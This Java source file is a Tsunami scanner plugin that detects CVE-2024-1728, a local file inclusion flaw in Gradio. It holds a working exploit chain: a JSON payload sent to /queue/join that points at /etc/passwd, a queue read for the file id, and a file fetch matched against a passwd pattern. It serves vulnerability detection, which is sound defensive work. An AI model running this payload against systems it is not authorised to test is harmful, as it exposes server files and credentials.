/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve20241728;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.base.Splitter;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.util.regex.Pattern;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2024-1728 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2024-1728 Detector",
    version = "0.1",
    description = "Checks for occurrences of CVE-2024-1728 in Gradio instances.",
    author = "frkngksl",
    bootstrapModule = Cve20241728DetectorBootstrapModule.class)
@ForWebService
public final class Cve20241728VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private static final String UPLOAD_PATH = "queue/join?";
  private static final String QUEUE_PATH = "queue/data?session_hash=hu6na4f3d08";
  private static final String FILE_READ_PATH = "file={{PATH_ID}}";

  private static final String FILE_UPLOAD_PAYLOAD =
      "{\"data\":[[{\"path\":\"/etc/passwd\",\"url\":\"http://127.0.0.1:7860/file=/help\",\"orig_name\":\"CHANGELOG.md\",\"size\":3549,\"mime_type\":\"text/markdown\"}]],\"event_data\":null,\"fn_index\":0,\"trigger_id\":2,\"session_hash\":\"hu6na4f3d08\"}";

  private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("(root:[x*]:0:0:)");

  private String pathId;

  private final HttpClient httpClient;

  @Inject
  Cve20241728VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient =
        checkNotNull(httpClient, "HttpClient cannot be null.")
            .modify()
            .setFollowRedirects(false)
            .build();
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE-2024-1728"))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2024-1728"))
            .setSeverity(Severity.HIGH)
            .setTitle("CVE-2024-1728 Gradio Local File Inclusion")
            .setDescription(
                "Gradio is vulnerable to a Local File Inclusion vulnerability, which was fixed"
                    + " in version 4.19.2, due to improper validation of user-supplied input in"
                    + " the UploadButton component. While the component handles file upload"
                    + " paths, it unintentionally allows attackers to redirect file uploads to"
                    + " arbitrary locations on the server. After this path change, attackers"
                    + " can exploit this vulnerability to read arbitrary files on the"
                    + " filesystem, such as private SSH keys, by manipulating the file path in"
                    + " the request to the /queue/join endpoint.")
            .setRecommendation("You can upgrade your Gradio instances to 4.19.2 or later.")
            .build());
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean checkGradioFingerprint(NetworkService networkService) {
    String targetWebAddress = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    var request = HttpRequest.get(targetWebAddress).withEmptyHeaders().build();

    try {
      HttpResponse response = httpClient.send(request, networkService);
      return response.status().isSuccess()
          && response
              .bodyString()
              .map(
                  body ->
                      body.contains("<meta property=\"og:url\" content=\"https://gradio.app/\" />"))
              .orElse(false);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return NetworkServiceUtils.isWebService(networkService)
        && checkGradioFingerprint(networkService);
  }

  private boolean sendFileUploadRequest(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + UPLOAD_PATH;
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetWebAddress)
                  .setHeaders(
                      HttpHeaders.builder().addHeader(CONTENT_TYPE, "application/json").build())
                  .setRequestBody(ByteString.copyFromUtf8(FILE_UPLOAD_PAYLOAD))
                  .build(),
              networkService);
      logger.atInfo().log("Response from file upload request: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
        return false;
      }
      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("event_id")) {
        logger.atInfo().log("Operation Queued!");
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean sendQueueViewRequest(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + QUEUE_PATH;

    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetWebAddress).withEmptyHeaders().build(), networkService);
      logger.atInfo().log("Response from queue view: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 200 || httpResponse.bodyString().isEmpty()) {
        return false;
      }
      Iterable<String> lines =
          Splitter.on("\n\n").split(httpResponse.bodyString().get()); // Handles both \n and \r\n
      for (String line : lines) {
        if (line.startsWith("data:")) {
          String eventData = line.substring(5).trim(); // Extract and trim event data
          JsonObject jsonResponse = JsonParser.parseString(eventData).getAsJsonObject();
          if (jsonResponse.keySet().contains("msg")
              && jsonResponse.keySet().contains("output")
              && jsonResponse.get("msg").getAsString().equals("process_completed")) {
            JsonObject jsonInOutputKey = jsonResponse.get("output").getAsJsonObject();
            if (jsonInOutputKey.keySet().contains("data")) {
              JsonArray jsonArrayInDataArrayKeyOuter = jsonInOutputKey.get("data").getAsJsonArray();
              if (!jsonArrayInDataArrayKeyOuter.isEmpty()) {
                JsonArray jsonArrayInDataArrayKeyInner =
                    jsonArrayInDataArrayKeyOuter.get(0).getAsJsonArray();
                if (!jsonArrayInDataArrayKeyInner.isEmpty()) {
                  JsonObject jsonPathKey = jsonArrayInDataArrayKeyInner.get(0).getAsJsonObject();
                  this.pathId = jsonPathKey.get("path").getAsString();
                  logger.atInfo().log("Parsed Path Id: %s", this.pathId);
                  return true;
                }
              }
            }
          }
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean readLocalFile(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + FILE_READ_PATH.replace("{{PATH_ID}}", this.pathId);

    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetWebAddress).withEmptyHeaders().build(), networkService);
      logger.atInfo().log("Vulnerable Response: %s", httpResponse.bodyString().get());
      String responseBody = httpResponse.bodyString().get();
      if (httpResponse.status().isSuccess()
          && VULNERABILITY_RESPONSE_PATTERN.matcher(responseBody).find()) {
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    logger.atInfo().log("Send a File Upload Request!");
    if (!sendFileUploadRequest(networkService)) {
      return false;
    }

    logger.atInfo().log("View the operation queue!");
    if (!sendQueueViewRequest(networkService)) {
      return false;
    }

    logger.atInfo().log("Try to read Local File!");
    if (!readLocalFile(networkService)) {
      return false;
    }

    return true;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(utcClock.instant().toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(getAdvisories().get(0))
        .build();
  }
}
